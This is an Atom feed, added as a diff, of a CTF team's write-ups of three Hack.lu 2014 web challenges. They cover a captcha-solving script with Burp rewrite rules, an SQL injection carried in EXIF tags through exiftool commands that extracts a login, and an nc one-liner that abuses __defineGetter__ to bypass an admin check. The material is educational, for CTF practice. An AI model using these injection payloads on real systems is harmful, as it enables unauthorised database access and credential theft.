@@ -1,0 +1,433 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: web | CaptchaFlag CTF Team]]></title>
+  <link href="http://www.captchaflag.com/blog/categories/web/atom.xml" rel="self"/>
+  <link href="http://www.captchaflag.com/"/>
+  <updated>2014-10-28T16:35:43-04:00</updated>
+  <id>http://www.captchaflag.com/</id>
+  <author>
+    <name><![CDATA[Captchaflag]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Hack.lu 2014 - Dalton's Corporate Security Safe for Business]]></title>
+    <link href="http://www.captchaflag.com/blog/2014/10/24/hack-dot-lu-2014-daltons-corporate-security-safe-for-business/"/>
+    <updated>2014-10-24T23:54:00-04:00</updated>
+    <id>http://www.captchaflag.com/blog/2014/10/24/hack-dot-lu-2014-daltons-corporate-security-safe-for-business</id>
+    <content type="html"><![CDATA[<h2>Challenge</h2>
+
+<p>The Dalton Brothers are tricking people into buying their &quot;safe&quot; locks. So they
+can rob them afterwards. The lock has some safety features, as it resets itself
+after a few seconds. It also requires a lot of valid inputs before it's letting
+you open it. Please find out what their weakness is and report back. </p>
+
+<p><a href="https://wildwildweb.fluxfingers.net:1422/">link</a></p>
+
+<h2>Analysis</h2>
+
+<p>The captcha image is being painted in a canvas clientside by JavaScript. This
+is done in 8 ways. 3 examples are:</p>
+
+<p>1) Base64 Decoding a value
+2) Using Javascript.fromCharCode()
+3) /n/.source</p>
+
+<p>These values are then inserted using
+<a href="http://www.w3schools.com/tags/canvas_filltext.asp">fillText()</a>. The fillText
+function looks like this (var,x,y), where x is left right relative to the HTML
+canvas and y is up down relative to the canvas.  So to put the numbers in
+order, you can grep out the fillText functions and sort by the x position to
+get them in the right order.</p>
+
+<h2>Solution</h2>
+
+<p>Since there is a lot of variance in how the variables are assigned and used to
+build the captcha (including some variable reuse), it seemed to make the most
+sense to store these values immediately after they are used, then populate and
+submit the form automatically. Because of this, I decided to modify the
+JavaScript inline using Burp. I used the following search/replace rules on the
+response body:</p>
+
+<p><code>
+match: &lt;script&gt;
+replace: &lt;script&gt;blakeval={};
+</code></p>
+
+<p><code>
+match: fillText\((.*?)\)
+replace: fillText($1);var args=&quot;$1&quot;.split(','); var b1=args[0]; var b2=args[1]; blakeval[b2]=eval(b1);
+</code></p>
+
+<p><code>
+match: &lt;/script&gt;
+replace: var fieldval = &quot;&quot;; for(var key in blakeval) { fieldval += blakeval[key] }; document.getElementsByName('solution')[0].value = fieldval; document.forms[0].submit()&lt;/script&gt;
+</code></p>
+
+<p>By using the x index from fillItem() as the key in property, it will be autosorted in the way that we need. Then simply populate the form and submit. Wait a while and then the link is unlocked.</p>
+
+<p><code>
+https://wildwildweb.fluxfingers.net:1422/?login=rRrtTE0WYFh5bVHToYQwKyvP
+</code></p>
+
+<p>Flag:
+<code>
+fef9565c97c3a62fe10d2a0084a9e8179d72f4a05084997cb80e900d1a77a42e3
+</code></p>
+
+<h2>Alternative Solution</h2>
+
+<p>This solution (written in Python) utilizes the following workflow:
+ * Request the HTTP session, find the &lt;script&gt; and separate the
+   Javascript into individual lines
+ * Parse the Javascript (minding the X-coordinate of the textfill() function to
+   reassemble the order.  There are a total of eight tricks they're using to
+   obfuscate the characters, so there's are eight branches depending on which
+   one we've encountered.
+ * Extract the characters and PHP session ID, then resubmit the page.
+ * Loop repeatedly until the locks allow access to the flag
+ * Access the flag when the URL is unlocked.</p>
+
+<p>It's a terrible, terrible script, but here it is for grins.</p>
+
+<p>```python</p>
+
+<h1>!/usr/bin/python</h1>
+
+<p>import sys
+import re # RegEx to extract <script> .* </script>
+import requests   # Used for GET/POST requests
+import base64  # Needed to deobfuscate some of the characters</p>
+
+<h1>This generates Javascript output and is used to verify the decoding of each character and position</h1>
+
+<p>debug = False</p>
+
+<h1>The hard work is broken into four functions</h1>
+
+<h1>isALetter - detect the presence of any of the eight obfuscation methods</h1>
+
+<h1>extractLetter - deobfuscate the Javascript (using one of eight techniques)</h1>
+
+<h1>isAPosition - detects the presence of fillText() which is used to draw a character and includes the X,Y coordinates</h1>
+
+<h1>extractPosition - extracts the X coordinates of the character being printed</h1>
+
+<p>def extractLetter(line):
+  if 'atob' in line:
+    if debug: print &quot;1&quot;, line,
+    line = line.split(&quot;(&quot;)[1]
+    line = line.split(&quot;)&quot;)[0]
+    line = base64.b64decode(line)
+    if debug: print  line
+    return line
+  elif 'fromCharCode' in line:
+    if debug: print &quot;2&quot;, line,
+    line = line.split(&quot;(&quot;)[1]
+    line = line.split(&quot;)&quot;)[0]
+    line = chr(int(line))
+    if debug: print  line
+    return line
+  elif '.source' in line:
+    if debug: print &quot;3&quot;, line, 
+    line = line.split(&quot;/&quot;)[1]
+    line = line.split(&quot;/&quot;)[0]
+    if debug: print line
+    return line
+  elif '!1' in line:    #false
+    string = &quot;false&quot;
+    if debug: print &quot;4&quot;, line, 
+    line = line.split(&quot;[&quot;)[1]
+    line = line.split(&quot;]&quot;)[0]
+    line = string[int(line)]
+    if debug: print line
+    return line
+  elif '[]+{}' in line:  #[object Object]
+    string = &quot;[object Object]&quot;
+    if debug: print &quot;5&quot;, line, 
+    line = line.split(&quot;[&quot;)[2]
+    if debug: print &quot;/&quot;,line,&quot;/&quot;,
+    line = line.split(&quot;]&quot;)[0]
+    if debug: print &quot;|&quot;,line,&quot;|&quot;,
+    line = string[int(line)]
+    if debug: print line
+    return line
+  elif &quot;&quot;&quot;[][+[]]+&quot;&quot;&quot;&quot;&quot; in line:
+    string = &quot;undefined&quot;
+    if debug: print &quot;6&quot;, line, 
+    line = line.split(&quot;[&quot;)[4]
+    line = line.split(&quot;]&quot;)[0]
+    line = string[int(line)]
+    if debug: print line
+    return line
+  elif &quot;''+!0&quot; in line:
+    string = &quot;true&quot;
+    if debug: print &quot;7&quot;, line, 
+    line = line.split(&quot;[&quot;)[1]
+    line = line.split(&quot;]&quot;)[0]
+    line = string[int(line)]
+    if debug: print line
+    return line
+  elif &quot;).toString(&quot; in line: 
+    string = &quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;
+    if debug: print &quot;8&quot;, line, 
+    line = line.split(&quot;(&quot;)[1]
+    line = line.split(&quot;)&quot;)[0]
+    line = string[int(line)]
+    if debug: print line
+    return line
+  elif 'var' in line and 'createLinearGradient' not in line and 'getContext' not in line:
+    print &quot;?&quot;, line
+    return &quot;&quot;
+  elif 'fillText' in line:
+    if debug: print &quot;!&quot;, line
+    return &quot;&quot;
+  else: 
+    return &quot;&quot;</p>
+
+<p>def isALetter(line):
+  if 'atob' in line: return True
+  elif 'fromCharCode' in line: return True
+  elif '.source' in line: return True
+  elif '!1' in line: return True
+  elif '[]+{}' in line: return True
+  elif &quot;&quot;&quot;[][+[]]+&quot;&quot;&quot;&quot;&quot; in line: return True
+  elif &quot;''+!0&quot; in line: return True
+  elif &quot;).toString(&quot; in line: return True
+  else: return False</p>
+
+<p>def isAPosition(line):
+  if 'fillText' in line: return True</p>
+
+<p>def extractPosition(line):
+  if 'fillText' in line:
+    pos = line.split(&quot;,&quot;)[1]
+    if debug: print &quot;POS = &quot;, pos
+    return int(pos)
+  else:
+    return false</p>
+
+<p>url='https://wildwildweb.fluxfingers.net:1422/'
+cookies = dict()
+params = dict()
+PHPSESSID = &quot;&quot;</p>
+
+<p>r = requests.get(url, cookies=cookies)</p>
+
+<p>PHPSESSID = r.cookies['PHPSESSID']
+cookies['PHPSESSID'] = PHPSESSID</p>
+
+<p>for i in range(0,100):</p>
+
+<p>r = requests.get(url, cookies=cookies)
+  #print r.cookies['PHPSESSID']</p>
+
+<p>script = re.findall(r&quot;.<em>script.</em>&quot;, r.content)[0]
+  scriptLines = re.sub(r&quot;;&quot;, &quot;;\n&quot;, script)
+  scriptLines = scriptLines.split(&quot;\n&quot;)</p>
+
+<p>answerArray = [None] * 100
+  answerString = &quot;&quot;</p>
+
+<p>for scriptLine in scriptLines:
+    if isALetter(scriptLine):
+      letter = extractLetter(scriptLine)
+    if isAPosition(scriptLine):
+      position = extractPosition(scriptLine)
+      answerArray[position] = letter</p>
+
+<p>for letter in answerArray:
+    if letter != None:
+      answerString += letter</p>
+
+<p>print &quot; -- REPLYING:&quot; , answerString
+  params['solution'] = answerString
+  params['submit'] = &quot;OK&quot;</p>
+
+<p>r = requests.post(url, cookies=cookies, data=params)</p>
+
+<p># print r.content</p>
+
+<p>for line in r.content.splitlines():
+    if '<p>' in line: print line
+    if '<li>' in line:
+      print line
+      if 'a href=&quot;?login=' in line:
+        line = line.split('&quot;')
+        q = requests.get(url + line[1], cookies=cookies)
+        print q.content
+        sys.exit(0)
+    if 'slow' in line: print line
+    if 'anew' in line: print line
+    if 'good' in line: print line
+```</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Hack.lu 2014 - ImageUpload]]></title>
+    <link href="http://www.captchaflag.com/blog/2014/10/24/hack-dot-lu-2014-imageupload/"/>
+    <updated>2014-10-24T09:25:00-04:00</updated>
+    <id>http://www.captchaflag.com/blog/2014/10/24/hack-dot-lu-2014-imageupload</id>
+    <content type="html"><![CDATA[<h2>Challenge</h2>
+
+<p>In the Wild Wild Web, there are really bad guys. The sheriff doesn't know them all. Therefore, he needs your help.
+Upload pictures of criminals to this site and help the sheriff to arrest them.
+You can make this Wild Wild Web much less wild!!!</p>
+
+<p>Pictures will be deleted on regular basis!</p>
+
+<h2>Analysis</h2>
+
+<p>The site is two separate pages. One is a simple submit form in which you upload an image to the site. It explicitly asks for .jpg or .jpeg images. The second page is a simple login form that has a valid username of <code>sheriff</code>, that can be detected based on differentiating responses of failed logins (invalid user vs invalid password).</p>
+
+<p>The form submissions explicitly asks for .jpg or .jpeg images, however if you rename the extension of another file type it appears to pass but
+has issues printing. After uploading the image, it displays three exif tags: <code>author</code>, <code>manufacturer</code>, and <code>model</code>. These tags, along with heigh tand width information are displayed in a table beneath the image.</p>
+
+<p>First attempts were to embed javascript into exif tags using exiftool, assuming a sheriff user would login to view the criminals. The values appear to be HTML encoded, however providing a single quote led to a database error. Looks like SQL injection.</p>
+
+<p>Here is the list of modifications I made to my jpeg to get info from the database:</p>
+
+<ul>
+<li><code>exiftool &quot;-artist=stacks0n&quot; hack.jpg</code>
+
+<ul>
+<li>ensure existence of Author field</li>
+</ul></li>
+<li><code>exiftool &quot;-artist=Artist','Manufacturer','Model') -- &quot; hack.jpg</code>
+
+<ul>
+<li>test injection</li>
+</ul></li>
+<li><code>exiftool -artist=Artist','Manufacturer',concat('a','b')) -- &quot; hack.jpg</code>
+
+<ul>
+<li>test for MySQL</li>
+</ul></li>
+<li><code>exiftool &quot;-artist=Artist','Manufacturer',(SELECT count(table_name) FROM information_schema.tables )) -- &quot; hack.jpg</code>
+
+<ul>
+<li>get number of tables (43)</li>
+</ul></li>
+<li><code>exiftool &quot;-artist=Artist','Manufacturer',(SELECT table_name FROM information_schema.tables LIMIT 42,1 )) -- &quot; hack.jpg</code>
+
+<ul>
+<li>get table name (users)</li>
+</ul></li>
+<li><code>exiftool &quot;-artist=Artist','Manufacturer',(SELECT column_name FROM information_schema.columns where table_name = 'users' LIMIT 0,1  )) -- &quot; hack.jpg</code>
+
+<ul>
+<li>get column names (id, name, password)</li>
+</ul></li>
+<li><code>exiftool &quot;-artist=Artist',(SELECT name from users where id = 1 ),(SELECT password from users where id = 1 )) -- &quot; hack.jpg</code>
+
+<ul>
+<li>get login info (sheriff, AO7eikkOCucCFJOyyaaQ)</li>
+</ul></li>
+</ul>
+
+<p>Lastly, login as sheriff for flag.</p>
+
+<h2>Solution</h2>
+
+<p>You are sucessfully logged in.</p>
+
+<p>Flag: flag{1_5h07_7h3_5h3r1ff}</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Hack.lu 2014 - Objection]]></title>
+    <link href="http://www.captchaflag.com/blog/2014/10/23/hack-dot-lu-2014-objection/"/>
+    <updated>2014-10-23T12:51:00-04:00</updated>
+    <id>http://www.captchaflag.com/blog/2014/10/23/hack-dot-lu-2014-objection</id>
+    <content type="html"><![CDATA[<h2>Challenge</h2>
+
+<p>This guard talks a weird dialect. And why does he talk in such a complicated
+way?
+<a href="https://wildwildweb.fluxfingers.net/static/chals/objection_4966674d17ff296939c0e3dfccfe87ed.co">Download</a></p>
+
+<p>nc wildwildweb.fluxfingers.net 1408</p>
+
+<h2>Analysis</h2>
+
+<p>Downloading the file gives us:</p>
+
+<p>```coffeescript
+const net = require \net
+const BufferStream = require \bufferstream</p>
+
+<p>admin<em>password = (require \fs).readFileSync \admin</em>password, \utf8</p>
+
+<p>server = net.createServer (con) -&gt;
+  console.log 'client connected'
+  con.write 'hello!\n'
+  client<em>context =
+    is</em>admin: false
+    token: (require \fs).readFileSync \secret<em>token, \utf8
+    login: ([password], cb) -&gt;
+      if password == admin</em>password
+        cb &quot;Authentication successful&quot;
+        @is<em>admin = true
+      else
+        cb &quot;Authentication failed&quot;
+    get</em>token: ([], cb) -&gt;
+      if not @is<em>admin then return cb &quot;You are not authorized to perform this action.&quot;
+      cb &quot;The current token is #{@token}&quot;
+  in</em>stream = new BufferStream {encoding:\utf8, size:\flexible}
+  con.pipe in<em>stream
+  &lt;- in</em>stream.split \n
+  it .= toString \utf8
+  console.log &quot;got line: #{it}&quot;
+  [funcname, ...args] = it.split ' '
+  if typeof client<em>context[funcname] != \function
+    return con.write &quot;error: unknown function #funcname\n&quot;
+  client</em>context[funcname] args, -&gt;
+    con.write &quot;#it\n&quot;</p>
+
+<p>server.listen 1408, -&gt;
+  console.log 'server bound'
+```</p>
+
+<p>Clearly, we would like to get the token.  Calling <code>get_token()</code> requires knowing
+the admin password.  The key thing to notice is the follow bit of code where
+user input is parsed and used:</p>
+
+<p><code>coffeescript
+  in_stream = new BufferStream {encoding:\utf8, size:\flexible}
+  con.pipe in_stream
+  &lt;- in_stream.split \\n
+  it .= toString \utf8
+  console.log &quot;got line: #{it}&quot;
+  [funcname, ...args] = it.split ' '
+  if typeof client_context[funcname] != \function
+    return con.write &quot;error: unknown function #funcname\n&quot;
+  client_context[funcname] args, -&gt;
+    con.write &quot;#it\n&quot;
+</code></p>
+
+<p>The first word of input is checked to be a function of the <code>client_context</code>
+object.  Since this is turned into javascript, there will be many built-in
+methods we could call besides <code>get_token()</code> and <code>login()</code>.</p>
+
+<p>One method, <code>__defineGetter__</code> takes as parameters a property and a function
+body.  By overriding <code>is_admin</code> with the function: <code>-&gt; con.write &quot;#it\n</code>, the
+check in <code>get_token()</code> will not function as expected, and we will be able to see
+the token.</p>
+
+<h2>Solution</h2>
+
+<p><code>
+$ echo -e &quot;__defineGetter__ is_admin\nget_token&quot; | nc wildwildweb.fluxfingers.net 1408
+hello!
+undefined
+The current token is flag{real_cowboys_dont_use_object_create_null}
+$
+</code></p>
+]]></content>
+  </entry>
+  
+</feed>
